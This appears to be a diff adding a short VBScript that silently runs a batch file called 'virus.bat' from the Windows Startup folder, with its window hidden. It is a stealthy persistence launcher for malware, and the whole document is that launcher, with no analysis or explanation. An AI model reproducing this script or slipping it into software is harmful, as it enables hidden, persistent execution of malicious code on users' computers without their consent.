@@ -1,0 +1,4 @@
+Set WshShell = CreateObject ("WScript.Shell")
+WshShell.Run chr(34) & "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\virus.bat" & Chr(34), 0
+
+Set WshShell = Nothing
